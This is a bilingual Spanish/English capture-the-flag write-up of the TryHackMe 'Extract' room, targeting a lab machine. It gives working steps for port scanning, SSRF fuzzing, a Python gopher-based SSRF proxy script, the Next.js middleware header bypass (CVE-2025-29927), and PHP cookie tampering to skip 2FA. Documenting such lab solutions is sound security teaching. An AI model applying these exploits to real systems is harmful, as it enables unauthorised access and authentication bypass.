# Extract [HARD]

### Información de la Sala / Room Information

* **Dificultad / Difficulty:** HARD (premium challenge).
* **Tipo / Type:** Web (SSRF, Next.js middleware bypass, cookie manipulation).
* **Slug:** `extract`
* **Link:** https://tryhackme.com/room/extract
* **Fuente / Source:** [Jery0843/TryHackMe](https://github.com/Jery0843/TryHackMe)

---

## Solucionario de Tareas / Task Solutions

### Reconocimiento Inicial / Initial Reconnaissance

```bash
nmap -T4 -n -sC -sV -Pn -p- 10.10.212.133
```

**Resultados:**
- **Port 22 (SSH):** OpenSSH 9.6p1
- **Port 80 (HTTP):** Apache 2.4.58

Visitando `http://10.10.212.133/` se revela **TryBookMe - Online Library**. El punto clave aparece en el código fuente de la página: endpoint `/preview.php` con un parámetro **url**.

### SSRF en /preview.php

**Prueba básica:**

```bash
echo "test" > test.txt
python3 -m http.server 80
```

Request:
```plaintext
http://10.10.212.133/preview.php?url=http://10.4.4.28/test.txt
```

El servidor descarga el contenido correctamente.

**Protocolos testeados:**
```text
file://   → Bloqueado
http://   → Funciona
gopher:// → Funciona
```

### Descubrimiento de Servicio Interno

Fuzzing de puertos internos vía SSRF:
```bash
ffuf -u 'http://10.10.212.133/preview.php?url=http://127.0.0.1:FUZZ/' -w <(seq 1 65535) -mc all -t 100 -fs 0
```

**Descubrimiento:** El puerto **10000** está escuchando internamente. `http://127.0.0.1:10000/` revela una aplicación **Next.js**.

### Proxy Gopher

Script Python para usar el SSRF como proxy hacia el servicio interno:
```python
#!/usr/bin/env python3
import socket, requests, urllib.parse, threading

LHOST = '127.0.0.1'
LPORT = 5000
TARGET_HOST = "10.10.212.133"
HOST_TO_PROXY = "127.0.0.1"
PORT_TO_PROXY = 10000

def handle_client(conn, addr):
    with conn:
        data = conn.recv(65536)
        double_encoded_data = urllib.parse.quote(urllib.parse.quote(data))
        target_url = f"http://{TARGET_HOST}/preview.php?url=gopher://{HOST_TO_PROXY}:{PORT_TO_PROXY}/_{double_encoded_data}"
        resp = requests.get(target_url)
        conn.sendall(resp.content)

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((LHOST, LPORT))
    server.listen(5)
    print(f"[*] Listening on {LHOST}:{LPORT}")
    while True:
        client_socket, addr = server.accept()
        client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_handler.start()

if __name__ == "__main__":
    start_server()
```

### Bypass de Autenticación en Next.js - CVE-2025-29927

Inyección del header de bypass:
```plaintext
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

Accediendo a `/customapi` se obtiene:
- **Flag 1**
- **Credenciales:** `librarian:L[REDACTED]!`

### Manipulación de Cookies - Bypass de 2FA

1. **Bypass de restricción IP:** usar el proxy SSRF apuntando al puerto 80 para acceder a `/management/`.
2. Tras iniciar sesión, `/management/2fa.php` establece esta cookie:
   ```
   O:9:"AuthToken":1:{s:9:"validated";b:0;}
   ```
3. Cambiar `b:0;` → `b:1;`
4. Esto bypasea el 2FA y revela **Flag 2**.

### Resumen de la Cadena de Explotación

- SSRF en `/preview.php`
- Protocolo gopher para acceso interno
- Bypass de middleware de Next.js (CVE-2025-29927)
- Manipulación de cookies para bypass de 2FA

**Flags Capturadas: 2/2**

---

*Documentación para propósitos educativos y registro de CTF. Fuente: writeup público verificado.*
